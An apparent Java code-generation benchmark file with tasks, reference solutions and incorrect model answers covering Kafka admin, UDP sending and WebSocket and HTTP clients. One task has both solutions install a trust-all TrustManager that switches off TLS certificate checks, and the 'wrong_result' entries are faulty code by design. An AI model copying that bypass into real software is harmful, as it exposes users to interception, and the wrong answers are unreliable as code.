    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic void example2(Vertx vertx) {\n    DatagramSocket socket = vertx.createDatagramSocket(new DatagramSocketOptions());\n    Buffer buffer = Buffer.buffer(\"content\");\n    socket\n      .send(buffer, 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n    socket\n      .send(\"A string used as content\", 1234, \"10.0.0.1\")\n      .onComplete(asyncResult -> System.out.println(\"Send succeeded? \" + asyncResult.succeeded()));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 14,
    "wrong_result": "DatagramSocket socket = vertx.createDatagramSocket();  \nBuffer buffer = Buffer.buffer(\"Hello, UDP via Buffer!\");  \nsocket.send(buffer, \"localhost\", 12345, ar -> {  \n    if (ar.succeeded()) System.out.println(\"Buffer send succeeded\");  \n    else System.out.println(\"Buffer send failed\");  \n});  \nsocket.send(\"Hello, UDP via String!\", \"localhost\", 12345, ar -> {  \n    if (ar.succeeded()) System.out.println(\"String send succeeded\");  \n    else System.out.println(\"String send failed\");  \n});"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Implement a Kafka topic administration utility class that provides functionality to describe Kafka topics using the AdminClient API.\n\nClass Description: The `KafkaTopicAdmin` class is a utility class designed to interact with Apache Kafka's administrative API. It provides methods to perform administrative operations on Kafka topics, specifically focusing on describing topic configurations. The class handles connection management and timeout configurations for administrative operations.\n\nAttributes:\n- configs: [Map<String, Object>] - Configuration properties for connecting to the Kafka cluster (e.g., bootstrap servers, security settings)\n- operationTimeout: [int] - Timeout duration in seconds for administrative operations\n\nMethods:\n- describeTopics: [describeTopics](String... topicNames) -> Map<String, TopicDescription> - Describes the specified Kafka topics by returning their configurations including partition count, replication factor, and other metadata. Throws KafkaException for operation failures or interruptions.\n- createAdmin: [createAdmin]() -> Admin - Creates and returns an AdminClient instance using the configured properties. Protected method for internal use.\n- getAdminConfig: [getAdminConfig]() -> Map<String, Object> - Returns a copy of the admin client configuration. Protected method for internal use.\n\nThe class implements AutoCloseable behavior through the AdminClient resource management in the describeTopics method, ensuring proper cleanup of resources. It handles various failure scenarios including timeouts, execution exceptions, and thread interruptions by wrapping them in appropriate KafkaException instances.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.springframework.kafka.KafkaException;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin {\n\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        try (Admin admin = createAdmin()) {\n            Map<String, TopicDescription> results = new HashMap<>();\n            DescribeTopicsResult topics = admin.describeTopics(Arrays.asList(topicNames));\n            try {\n                results.putAll(topics.allTopicNames().get(this.operationTimeout, TimeUnit.SECONDS));\n                return results;\n            }\n            catch (InterruptedException ie) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted while getting topic descriptions\", ie);\n            }\n            catch (TimeoutException | ExecutionException ex) {\n                throw new KafkaException(\"Failed to obtain topic descriptions\", ex);\n            }\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        final Map<String, Object> configs2 = new HashMap<>(this.configs);\n        return configs2;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "wrong_result": "public class KafkaTopicAdmin {\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    protected AdminClient createAdmin() {\n        Map<String, Object> config = new HashMap<>(configs);\n        config.put(\"request.timeout.ms\", operationTimeout * 1000);\n        return AdminClient.create(config);\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        return new HashMap<>(configs);\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        AdminClient adminClient = createAdmin();\n        try {\n            DescribeTopicsResult result = adminClient.describeTopics(topicNames);\n            Map<String, TopicDescription> descriptions = result.all().get();\n            adminClient.close();\n            return descriptions;\n        } catch (InterruptedException | ExecutionException | TimeoutException e) {\n            throw new KafkaException(\"Failed to describe topics\", e);\n        } finally {\n            try {\n                adminClient.close();\n            } catch (IOException e) {\n                throw new KafkaException(\"Failed to close AdminClient\", e);\n            }\n        }\n    }\n\n    @Override\n    public void close() {\n        // AutoCloseable implementation to ensure AdminClient is closed\n        // This would typically be managed via try-with-resources\n    }\n}"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket client class for handling device management operations in a cross-platform environment (Android/iOS), including device occupation, release, and various debug operations.\n\nClass Description: TransportClient is a WebSocket client implementation that handles communication with a device management server. It manages device resources, processes incoming commands, and coordinates debug sessions for both Android and iOS devices.\n\nAttributes:\n- Inherited from WebSocketClient: Basic WebSocket connection attributes (URI, connection state, etc.)\n- No additional attributes declared (uses inherited functionality)\n\nMethods:\n1. TransportClient(URI serverUri) -> void - Constructor that initializes the WebSocket client with the server URI.\n\n2. onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Logs connection status.\n\n3. onMessage(String s) -> void - Handles incoming messages from server. Parses JSON messages and delegates to appropriate handler methods based on message type. Runs handlers in a thread pool.\n\n4. onClose(int i, String s, boolean b) -> void - Callback when connection closes. Handles cleanup and reconnection logic.\n\n5. onError(Exception e) -> void - Callback for connection errors. Logs error messages.\n\n6. handleOccupyMessage(JSONObject jsonObject) -> void - Processes device occupation requests. Locks device and initiates platform-specific debug setup.\n   - Input: JSONObject containing device info and debug parameters\n   - Output: None (side effects: device lock, debug session setup)\n\n7. handleAndroidOccupy(String udId, JSONObject jsonObject) -> void - Android-specific occupation handler. Starts debug session and required services.\n   - Input: \n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: Android debug session setup)\n\n8. handleIOSOccupy(String udId, JSONObject jsonObject) -> void - iOS-specific occupation handler. Starts debug session and required services.\n   - Input:\n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: iOS debug session setup)\n\n(Note: The class contains additional private handler methods for other message types that follow similar patterns to handleOccupyMessage, but they are not fully shown in the reference code. These would include handlers for release, debug steps, suite operations, etc.)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\n\npublic class TransportClient extends WebSocketClient {\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        log.info(\"Connected and auth...\");\n    }\n\n    @Override\n    public void onMessage(String s) {\n        JSONObject jsonObject = JSON.parseObject(s);\n        if (jsonObject.getString(\"msg\").equals(\"pong\")) {\n            return;\n        }\n        log.info(\"Agent <- Server message: {}\", jsonObject);\n        TransportWorker.cachedThreadPool.execute(() -> {\n            switch (jsonObject.getString(\"msg\")) {\n                case \"occupy\" -> handleOccupyMessage(jsonObject);\n                case \"release\" -> handleReleaseMessage(jsonObject);\n                case \"stopDebug\" -> handleStopDebugMessage(jsonObject);\n                case \"settings\" -> handleSettingsMessage(jsonObject);\n                case \"auth\" -> handleAuthMessage(jsonObject);\n                case \"shutdown\" -> AgentManagerTool.stop();\n                case \"reboot\" -> handleRebootMessage(jsonObject);\n                case \"heartBeat\" -> handleHeartBeatMessage();\n                case \"hub\" -> PHCTool.setPosition(jsonObject.getInteger(\"position\"), jsonObject.getString(\"type\"));\n                case \"runStep\" -> handleRunStepMessage(jsonObject);\n                case \"debugStep\" -> handleDebugStepMessage(jsonObject);\n                case \"suite\" -> handleSuiteMessage(jsonObject);\n                case \"forceStopSuite\" -> handleForceStopSuiteMessage(jsonObject);\n            }\n        });\n    }\n\n    @Override\n    public void onClose(int i, String s, boolean b) {\n        if (TransportWorker.isKeyAuth) {\n            log.info(\"Server disconnected. Retry in 10s...\");\n        }\n        if (TransportWorker.client == this) {\n            TransportWorker.client = null;\n        }\n    }\n\n    @Override\n    public void onError(Exception e) {\n        log.info(e.getMessage());\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) {\n        String udId = jsonObject.getString(\"udId\");\n        String token = jsonObject.getString(\"token\");\n        int platform = jsonObject.getInteger(\"platform\");\n\n        boolean lockSuccess = false;\n        try {\n            lockSuccess = DevicesLockMap.lockByUdId(udId, 30L, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            log.info(\"Fail to get device lock, cause {}\", e.getMessage());\n        }\n        if (!lockSuccess) {\n            log.info(\"Fail to get device lock... please make sure device is not busy.\");\n            return;\n        }\n\n        switch (platform) {\n            case PlatformType.ANDROID -> handleAndroidOccupy(udId, jsonObject);\n            case PlatformType.IOS -> handleIOSOccupy(udId, jsonObject);\n        }\n\n        JSONObject jsonDebug = new JSONObject();\n        jsonDebug.put(\"msg\", \"debugUser\");\n        jsonDebug.put(\"token\", token);\n        jsonDebug.put(\"udId\", udId);\n        TransportWorker.send(jsonDebug);\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"android lock udId\uff1a{}\", udId);\n        AndroidDeviceLocalStatus.startDebug(udId);\n\n        IDevice iDevice = AndroidDeviceBridgeTool.getIDeviceByUdId(udId);\n        if (iDevice == null) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sasPort = jsonObject.getInteger(\"sasRemotePort\");\n        int uiaPort = jsonObject.getInteger(\"uia2RemotePort\");\n\n        if (sasPort != 0) {\n            AndroidSupplyTool.startShare(udId, sasPort);\n        }\n\n        if (uiaPort != 0) {\n            try {\n                AndroidDeviceBridgeTool.startUiaServer(iDevice, uiaPort);\n            } catch (InstallException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    androidRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject jsonObject) {\n        log.info(\"ios lock udId\uff1a{}\", udId);\n        IOSDeviceLocalStatus.startDebug(udId);\n\n        if (!SibTool.getDeviceList().contains(udId)) {\n            log.info(\"Target device is not connecting, please check the connection.\");\n            return;\n        }\n\n        int sibPort = jsonObject.getInteger(\"sibRemotePort\");\n        int wdaPort = jsonObject.getInteger(\"wdaServerRemotePort\");\n        int wdaMjpegPort = jsonObject.getInteger(\"wdaMjpegRemotePort\");\n\n        if (sibPort != 0) {\n            SibTool.startShare(udId, sibPort);\n        }\n\n        if (wdaPort != 0 || wdaMjpegPort != 0) {\n            try {\n                SibTool.startWda(udId, wdaPort, wdaMjpegPort);\n            } catch (IOException | InterruptedException e) {\n                log.error(e.getMessage());\n            }\n        }\n\n        OccupyMap.map.put(udId,\n                ScheduleTool.schedule(() -> {\n                    log.info(\"time up!\");\n                    iosRelease(udId);\n                }, BytesTool.remoteTimeout));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class TransportClient extends WebSocketClient {\n    private ExecutorService threadPool;\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n        threadPool = Executors.newCachedThreadPool();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"WebSocket connection established\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        try {\n            JSONObject json = new JSONObject(message);\n            String type = json.getString(\"type\");\n            threadPool.submit(() -> {\n                try {\n                    switch (type) {\n                        case \"occupy\":\n                            handleOccupyMessage(json);\n                            break;\n                        case \"release\":\n                            handleReleaseMessage(json);\n                            break;\n                        case \"debug_step\":\n                            handleDebugStepMessage(json);\n                            break;\n                        case \"suite_operation\":\n                            handleSuiteOperationMessage(json);\n                            break;\n                        default:\n                            System.out.println(\"Unknown message type: \" + type);\n                    }\n                } catch (Exception e) {\n                    System.err.println(\"Error processing message: \" + e.getMessage());\n                }\n            });\n        } catch (Exception e) {\n            System.err.println(\"Error parsing message: \" + e.getMessage());\n        }\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"WebSocket connection closed: \" + reason);\n        // Reconnect logic can be implemented here\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        System.err.println(\"WebSocket error: \" + ex.getMessage());\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) throws JSONException {\n        String platform = jsonObject.getString(\"platform\");\n        String udId = jsonObject.getString(\"udId\");\n        JSONObject params = jsonObject.getJSONObject(\"params\");\n        if (\"android\".equals(platform)) {\n            handleAndroidOccupy(udId, params);\n        } else if (\"ios\".equals(platform)) {\n            handleIOSOccupy(udId, params);\n        }\n    }\n\n    private void handleAndroidOccupy(String udId, JSONObject params) throws JSONException {\n        // Android-specific occupation logic\n        System.out.println(\"Starting Android debug session for device: \" + udId);\n        // Lock device and initialize debug services\n    }\n\n    private void handleIOSOccupy(String udId, JSONObject params) throws JSONException {\n        // iOS-specific occupation logic\n        System.out.println(\"Starting iOS debug session for device: \" + udId);\n        // Lock device and initialize debug services\n    }\n\n    private void handleReleaseMessage(JSONObject jsonObject) throws JSONException {\n        String udId = jsonObject.getString(\"udId\");\n        // Release device logic\n        System.out.println(\"Releasing device: \" + udId);\n    }\n\n    private void handleDebugStepMessage(JSONObject jsonObject) throws JSONException {\n        String udId = jsonObject.getString(\"udId\");\n        String step = jsonObject.getString(\"step\");\n        // Execute debug step\n        System.out.println(\"Executing debug step: \" + step + \" on device: \" + udId);\n    }\n\n    private void handleSuiteOperationMessage(JSONObject jsonObject) throws JSONException {\n        String udId = jsonObject.getString(\"udId\");\n        String operation = jsonObject.getString(\"operation\");\n        // Execute suite operation\n        System.out.println(\"Performing suite operation: \" + operation + \" on device: \" + udId);\n    }\n}"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create a Java class for HTTP communication that supports both HTTP and HTTPS protocols, with methods for GET and POST requests, including SSL configuration for secure connections.\n\nClass Description: The HttpCommunicationClient class provides functionality for making HTTP/HTTPS requests with configurable SSL settings. It supports both synchronous GET and POST operations with customizable headers and request bodies.\n\nAttributes:\n- usesSSL: boolean - Indicates whether to use HTTPS (true) or HTTP (false)\n- sslContext: SSLContext - SSL context configuration for HTTPS connections\n- address: InetSocketAddress - The target server address (host and port)\n- uri: URI - Base URI constructed from the address and protocol\n- httpClient: HttpClient - The HTTP client instance for making requests\n- trustAll: TrustManager[] - Array of trust managers that accept all certificates (bypasses SSL verification)\n\nMethods:\n- HttpCommunicationClient(boolean useSSL) -> Constructor - Initializes the client with SSL configuration\n- initialize(InetSocketAddress address) -> void - Sets up the HTTP client with target address and creates base URI\n- get(String urlPath) -> HttpResponse<String> - Sends a GET request to the specified URL path and returns the response\n- post(String urlPath, String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the specified URL path\n- post(String body, String[]... headers) -> HttpResponse<String> - Sends a POST request with body and headers to the base URI",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpRequest.Builder;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Locale;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509ExtendedTrustManager;\n\npublic class HttpCommunicationClient {\n\n    private final boolean usesSSL;\n    private final SSLContext sslContext;\n    private InetSocketAddress address;\n    protected URI uri;\n    protected HttpClient httpClient;\n\n    private static TrustManager[] trustAll = new TrustManager[]{\n        new X509ExtendedTrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return null;\n            }\n\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {\n            }\n\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, Socket socket) throws CertificateException {\n            }\n\n            @Override\n            public void checkClientTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] chain, String authType, SSLEngine engine) throws CertificateException {\n            }\n        }\n    };\n\n    public HttpCommunicationClient(boolean useSSL) {\n        try {\n            sslContext = SSLContext.getInstance(\"TLSv1.2\");\n            sslContext.init(null, trustAll, new SecureRandom());\n        } catch (KeyManagementException | NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n        this.usesSSL = useSSL;\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .sslContext(sslContext)\n            .build();\n        this.address = address;\n        this.uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/_sql?error_trace\",\n            usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort()));\n    }\n\n    public HttpResponse<String> get(String urlPath) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[] ... headers) throws Exception {\n        assert urlPath != null : \"url cannot be null\";\n        URI uri = URI.create(String.format(Locale.ENGLISH,\n            \"%s://%s:%s/%s\", usesSSL ? \"https\" : \"http\", address.getHostName(), address.getPort(), urlPath));\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .POST(body == null ? BodyPublishers.noBody() : BodyPublishers.ofString(body))\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> post(String body, String[] ... headers) throws Exception {\n        Builder builder = HttpRequest.newBuilder(uri)\n            .header(\"Content-Type\", \"application/json\");\n        if (body != null) {\n            builder.POST(BodyPublishers.ofString(body));\n        }\n        for (String[] header : headers) {\n            builder.headers(header[0], header[1]);\n        }\n        return httpClient.send(builder.build(), BodyHandlers.ofString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class HttpCommunicationClient {\n    private boolean usesSSL;\n    private SSLContext sslContext;\n    private InetSocketAddress address;\n    private URI uri;\n    private HttpClient httpClient;\n    private TrustManager[] trustAll;\n\n    public HttpCommunicationClient(boolean useSSL) {\n        this.usesSSL = useSSL;\n        this.trustAll = new TrustManager[] {\n            new X509TrustManager() {\n                public X509Certificate[] getAcceptedIssuers() { return null; }\n                public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n            }\n        };\n        try {\n            this.sslContext = SSLContext.getInstance(\"TLS\");\n            this.sslContext.init(null, trustAll, new SecureRandom());\n        } catch (Exception e) {\n            throw new RuntimeException(\"SSL context initialization failed\", e);\n        }\n    }\n\n    public void initialize(InetSocketAddress address) {\n        this.address = address;\n        this.uri = UriBuilder.fromUri(usesSSL ? \"https://\" : \"http://\")\n            .host(address.getHostString())\n            .port(address.getPort())\n            .build();\n        if (usesSSL) {\n            this.httpClient = HttpClient.newBuilder()\n                .sslContext(sslContext)\n                .protocols(HttpClient.Version.HTTP_1_1)\n                .build();\n        } else {\n            this.httpClient = HttpClient.newBuilder()\n                .protocols(HttpClient.Version.HTTP_1_1)\n                .build();\n        }\n    }\n\n    public HttpResponse<String> get(String urlPath) {\n        URI fullUri = UriBuilder.fromUri(uri).path(urlPath).build();\n        HttpRequest request = HttpRequest.newBuilder(fullUri)\n            .GET()\n            .build();\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response;\n    }\n\n    public HttpResponse<String> post(String urlPath, String body, String[]... headers) {\n        URI fullUri = UriBuilder.fromUri(uri).path(urlPath).build();\n        Map<String, List<String>> headerMap = new HashMap<>();\n        for (String[] header : headers) {\n            if (header.length >= 2) {\n                String name = header[0];\n                String value = header[1];\n                headerMap.computeIfAbsent(name, k -> new ArrayList<>()).add(value);\n            }\n        }\n        HttpRequest request = HttpRequest.newBuilder(fullUri)\n            .POST(HttpRequest.BodyPublishers.ofString(body))\n            .headers(headerMap)\n            .build();\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response;\n    }\n\n    public HttpResponse<String> post(String body, String[]... headers) {\n        URI fullUri = uri;\n        Map<String, List<String>> headerMap = new HashMap<>();\n        for (String[] header : headers) {\n            if (header.length >= 2) {\n                String name = header[0];\n                String value = header[1];\n                headerMap.computeIfAbsent(name, k -> new ArrayList<>()).add(value);\n            }\n        }\n        HttpRequest request = HttpRequest.newBuilder(fullUri)\n            .POST(HttpRequest.BodyPublishers.ofString(body))\n            .headers(headerMap)\n            .build();\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response;\n    }\n}"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Create a WebSocket client class in Java using the org.java_websocket library to establish a connection to a WebSocket server and handle communication events.\n\nClass Description: The SimpleClient class extends WebSocketClient to provide a basic WebSocket client implementation. It handles connection events, message reception, connection closure, and errors through callback methods.\n\nAttributes:\n- serverUri: URI - The URI of the WebSocket server to connect to (inherited from WebSocketClient)\n\nMethods:\n- SimpleClient(URI serverUri) -> None - Constructor that initializes the WebSocket client with the server URI.\n- onOpen(ServerHandshake handshakedata) -> void - Callback method invoked when the WebSocket connection is successfully opened.\n- onMessage(String message) -> void - Callback method invoked when a text message is received from the server.\n- onClose(int code, String reason, boolean remote) -> void - Callback method invoked when the WebSocket connection is closed.\n- onError(Exception ex) -> void - Callback method invoked when an error occurs in the WebSocket connection.",
    "Canonical_solution": "import java.net.URI;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SimpleClient extends WebSocketClient {\n\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        // Handle connection opening\n    }\n\n    @Override\n    public void onMessage(String message) {\n        // Handle text message received\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        // Handle connection closing\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        // Handle errors\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class SimpleClient extends WebSocketClient {\n    public SimpleClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        System.out.println(\"Connection opened\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed (\" + code + \"): \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        ex.printStackTrace();\n    }\n}"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket client class that handles secure WebSocket connections with custom SSL configuration and event delegation.\n\nClass Description: WebSocketTransport is a WebSocket client implementation that extends the WebSocketClient class from the org.java_websocket library. It manages WebSocket connections with optional SSL/TLS encryption and delegates connection events to a listener interface. The class handles connection establishment, message reception, and connection termination events.\n\nAttributes:\n- CONNECT_TIMEOUT: int - Static constant defining the connection timeout in milliseconds (5000ms)\n- webSocketListener: WebSocketListener - Interface reference for handling WebSocket events (open, message, close, error)\n\nMethods:\n- WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) -> None - Constructor that initializes the WebSocket client with server URI, SSL properties, custom headers, and event listener. Throws URISyntaxException for invalid URIs.\n- onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Delegates to webSocketListener.\n- onMessage(String s) -> void - Callback when a text message is received. Delegates to webSocketListener.\n- onClose(int code, String reason, boolean remote) -> void - Callback when connection is closed. Delegates to webSocketListener.\n- onError(Exception e) -> void - Callback when an error occurs. Delegates to webSocketListener.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.servicecomb.foundation.ssl.SSLManager;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class WebSocketTransport extends WebSocketClient {\n  public static final int CONNECT_TIMEOUT = 5000;\n\n  private final WebSocketListener webSocketListener;\n\n  public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties,\n      Map<String, String> headers, WebSocketListener webSocketListener)\n      throws URISyntaxException {\n    super(new URI(serverUri), new Draft_6455(), headers, CONNECT_TIMEOUT);\n\n    if (sslProperties.isEnabled()) {\n      SSLSocketFactory sslSocketFactory = SSLManager\n          .createSSLSocketFactory(sslProperties.getSslOption(), sslProperties.getSslCustom());\n      URI uri = new URI(serverUri);\n      setSocketFactory(new SSLSocketFactoryExt(sslSocketFactory, uri.getHost(), uri.getPort()));\n    }\n\n    this.webSocketListener = webSocketListener;\n  }\n\n  @Override\n  public void onOpen(ServerHandshake serverHandshake) {\n    this.webSocketListener.onOpen(serverHandshake);\n  }\n\n  @Override\n  public void onMessage(String s) {\n    this.webSocketListener.onMessage(s);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    this.webSocketListener.onClose(code, reason, remote);\n  }\n\n  @Override\n  public void onError(Exception e) {\n    this.webSocketListener.onError(e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "wrong_result": "public class WebSocketTransport extends WebSocketClient {\n    public static final int CONNECT_TIMEOUT = 5000;\n\n    private final WebSocketListener webSocketListener;\n\n    public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) throws URISyntaxException {\n        super(new URI(serverUri), headers);\n        this.webSocketListener = webSocketListener;\n        setConnectionTimeout(CONNECT_TIMEOUT);\n        configureSSL(sslProperties);\n        connect();\n    }\n\n    private void configureSSL(HttpConfiguration.SSLProperties sslProperties) {\n        try {\n            KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            trustStore.load(null, null);\n            TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n            tmf.init(trustStore);\n\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            keyStore.load(null, null);\n            KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n            kmf.init(keyStore, null);\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);\n            SSLContext.setDefault(sslContext);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to configure SSL\", e);\n        }\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshake) {\n        webSocketListener.onOpen(handshake);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        webSocketListener.onMessage(message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        webSocketListener.onClose(code, reason, remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        webSocketListener.onError(ex);\n    }\n}"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket client class in Java using the org.java_websocket library to establish a WebSocket connection, handle connection events, and manage message exchange with a WebSocket server.\n\nClass Description: The MyWebSocketClient class extends WebSocketClient to create a WebSocket client that connects to a specified URI. It overrides key WebSocket event-handling methods to manage connection lifecycle events and message processing. The class uses a CountDownLatch to synchronize thread operations during connection closure.\n\nAttributes:\n- onCloseLatch: CountDownLatch - A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes, specifically used to signal when the WebSocket connection is closed.\n\nMethods:\n- MyWebSocketClient(URI uri, CountDownLatch latch) -> None - Constructor that initializes the WebSocket client with the server URI and a CountDownLatch for connection closure synchronization.\n- onOpen(ServerHandshake handshakedata) -> None - Callback method invoked when a WebSocket connection is successfully established.\n- onMessage(String message) -> None - Callback method invoked when a message is received from the WebSocket server.\n- onClose(int code, String reason, boolean remote) -> None - Callback method invoked when the WebSocket connection is closed, triggers the CountDownLatch.\n- onError(Exception ex) -> None - Callback method invoked when an error occurs on the WebSocket connection.",
